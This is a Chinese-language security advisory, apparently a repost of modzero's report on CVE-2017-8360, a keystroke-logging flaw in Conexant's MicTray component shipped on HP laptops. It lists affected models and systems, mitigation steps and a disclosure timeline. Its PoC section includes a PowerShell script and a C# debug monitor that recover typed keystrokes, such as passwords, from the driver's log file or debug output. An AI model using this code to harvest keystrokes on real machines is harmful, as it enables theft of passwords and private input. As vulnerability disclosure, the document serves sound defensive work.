此外，值得一提的是，恶意软件开发者通过该漏洞获取敏感信息，不会被启发式杀毒软件检测。不推荐通过将键盘记录内容写入磁盘或调试OutputDebugStringW()给任意进程提供任何键盘输入的敏感信息。
**漏洞影响**
在当前用户会话中运行的任何进程可以因此监控调试信息，可以记录用户通过键盘输入的任意内容。由此，该进程可以记录敏感数据，如密码等。不会触发任意恶意行为，因此可以逃避杀毒软件的检测。
此外，运行在操作系统上的任何进程都可以通过访问特定的路径获取用户输入的敏感信息。为什么所有的按键信息都会被记录，Conexant（世界最大的通信电子半导体独立研发厂商）会不会随时收集键盘记录的日志信息，那就不得而知了。
**PoC**
这个PoC通过PowerShell解析MicTray.log中的内容。
    $filename = "c:userspublicMicTray.log"
    [System.IO.FileStream]   $fs = [System.IO.File]::Open(
          $filename, 
          [System.IO.FileMode]::Open, 
          [System.IO.FileAccess]::Read, 
          [System.IO.FileShare]::ReadWrite)
    [System.IO.StreamReader] $fr = [System.IO.StreamReader]::new(
          $fs, 
          [Text.UTF8Encoding]::UNICODE)
    $el = 0
    while($el -lt 2) {
       $line = $fr.ReadLine()
       # handle broken newlines in log...
       if([string]::IsNullOrEmpty($line)) {
          $el++
       } else {
          $el=0
       }
       $mc = [regex]::Match($line, 
             "MicTray64.exe.*flags (0x0[A-Fa-f0-9]?).*vk (0x[A-Fa-f0-9]+)$")
       $r = $mc.Groups[2].Value
       if(-Not [string]::IsNullOrEmpty($r)) {
          $i = [convert]::ToInt32($r, 16)
          $c = [convert]::ToChar($i)
          if($i -lt 0x20 -or $i -gt 0x7E) { $c = '.' }
          write-host -NoNewLine $("{0}" -f $c)
       }
    }
然而，如果没有记录日志文件，只要按照Microsoft的DbMon Debug
Monitor方法捕获传递给OutputDebugString的字符串同样也可获得键盘记录信息：
    namespace mod0_dbgview
    {
        class Program
        {
            public static void Main(string[] args)
            {
                DebugMonitor.Start();
                DebugMonitor.OnOutputDebugString += new
                      OnOutputDebugStringHandler(OnOutputDebugString);
                Console.WriteLine("Press 'Enter' to exit.");
                Console.ReadLine();
                DebugMonitor.Stop();
            }
            // version 1.0.0.46
            private static void OnOutputDebugString(int pid, string text)
            {
                char sep = ' ';
                char nl = 'n';
                text = text.TrimEnd(nl);
                string[] items = text.Split(sep);
                if (items[7].Equals("Mic"))
                {
                    int c_int = Convert.ToInt32(items[17], 16);
                    if (c_int == 0xd)
                    {
                        Console.WriteLine();
                    }
                    else if (Convert.ToInt32(items[13], 16) == 0x00)
                        Console.Write("{0}", (char)(c_int & 0xff));
                }
            }
            // version 1.0.0.31
            private static void OnOutputDebugString_v31(
                int pid, 
                string text)
            {
                char sep = ' ';
                string[] items = text.Split(sep);
                if (items[0].Equals("Mic"))
                {
                    int c_int = Convert.ToInt32(items[10], 16);
                    if (c_int == 0xd)
                    {
                        Console.WriteLine();
                    }
                    else if(Convert.ToInt32(items[6], 16) == 0x00)
                        Console.Write("{0}", (char)(c_int & 0xff));
                }
            }
        }
    }
任何框架提供了一个API
ReadFile()或Microsoft的MapViewOfFile()都可以捕捉Conexant音频驱动程序获取的键盘输入信息。通过使用Microsoft
Windows Sysinternals Debugview，如果敏感内容没有写入文件，也可以轻松地获取键盘输入信息。
**受该漏洞影响的产品**
**硬件产品型号**
    HP EliteBook 820 G3 Notebook PC
    HP EliteBook 828 G3 Notebook PC
    HP EliteBook 840 G3 Notebook PC
    HP EliteBook 848 G3 Notebook PC
    HP EliteBook 850 G3 Notebook PC
    HP ProBook 640 G2 Notebook PC
    HP ProBook 650 G2 Notebook PC
    HP ProBook 645 G2 Notebook PC
    HP ProBook 655 G2 Notebook PC
    HP ProBook 450 G3 Notebook PC
    HP ProBook 430 G3 Notebook PC
    HP ProBook 440 G3 Notebook PC
    HP ProBook 446 G3 Notebook PC
    HP ProBook 470 G3 Notebook PC
    HP ProBook 455 G3 Notebook PC
    HP EliteBook 725 G3 Notebook PC
    HP EliteBook 745 G3 Notebook PC
    HP EliteBook 755 G3 Notebook PC
    HP EliteBook 1030 G1 Notebook PC
    HP ZBook 15u G3 Mobile Workstation
    HP Elite x2 1012 G1 Tablet
    HP Elite x2 1012 G1 with Travel Keyboard
    HP Elite x2 1012 G1 Advanced Keyboard
    HP EliteBook Folio 1040 G3 Notebook PC
    HP ZBook 17 G3 Mobile Workstation
    HP ZBook 15 G3 Mobile Workstation
    HP ZBook Studio G3 Mobile Workstation
    HP EliteBook Folio G1 Notebook PC
**操作系统**
    Microsoft Windows 10 32
    Microsoft Windows 10 64
    Microsoft Windows 10 IOT Enterprise 32-Bit (x86)
    Microsoft Windows 10 IOT Enterprise 64-Bit (x86)
    Microsoft Windows 7 Enterprise 32 Edition
    Microsoft Windows 7 Enterprise 64 Edition
    Microsoft Windows 7 Home Basic 32 Edition
    Microsoft Windows 7 Home Basic 64 Edition
    Microsoft Windows 7 Home Premium 32 Edition
    Microsoft Windows 7 Home Premium 64 Edition
    Microsoft Windows 7 Professional 32 Edition
    Microsoft Windows 7 Professional 64 Edition
    Microsoft Windows 7 Starter 32 Edition
    Microsoft Windows 7 Ultimate 32 Edition
    Microsoft Windows 7 Ultimate 64 Edition
    Microsoft Windows Embedded Standard 7 32
    Microsoft Windows Embedded Standard 7E 32-Bit
其它使用了Conexant硬件和驱动器的硬件厂商也有可能受该问题影响。
**缓解方法**
删除MicTray可执行文件和相应的日志记录文件。仅仅删除计划任务是不能解决问题的，因为Windows服务CxMonSvc将再一次启动MicTray。
**可执行文件的位置：** C:WindowsSystem32MicTray64.exe
**日志文件的位置：** C:UsersPublicMicTray.log
**漏洞披露时间轴**
2017-04-28：漏洞在MicTray64 1.0.0.31被发现
2017-04-28：通过邮件与供应商Conexant联系
2017-04-29：在MicTray64 1.0.0.46中发现影响更大的漏洞
2017-04-30：分配此漏洞的CVE编号为CVE-2017-8360
2017-05-01：联系Hewlett-Packard企业安全顾问详细说明了该漏洞相关的问题
2017-05-02：通过Twitter联系供应商Conexant
2017-05-05：向HPE安全联系人发送相关技术信息。告知HPE关于在5月8日星期一发布相关细节
2017-05-05：发送相关技术资料后，收到HPE的一些注意事项。他们试图通知惠普公司的安全人员
2017-05-11：发布安全公告
**参考链接**
[1] [LowLevelKeyboardProc callback function](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985\(v=vs.85\).aspx)
[2] [KBDLLHOOKSTRUCT structure](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644967\(v=vs.85\).aspx)
[3] [DbMon: Implements a Debug Monitor](https://msdn.microsoft.com/en-us/library/aa242171\(v=vs.60\).aspx)
[4] [MSDN/OutputDebugString function](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363362\(v=vs.85\).aspx)
[5] [Microsoft Windows Sysinternals
DebugView](https://technet.microsoft.com/en-us/sysinternals/debugview.aspx)
[6] [modzero Security Advisory: Unintended/Covert Storage Channel for
sensitive data in Conexant HD Audio Driver Package.
[MZ-17-01]](https://www.modzero.ch/advisories/MZ-17-01-Conexant-Keylogger.txt)
**传送门**
* * *
[**【安全预警】惠普笔记本音频驱动竟内置键盘记录器后门！**](http://bobao.360.cn/news/detail/4159.html)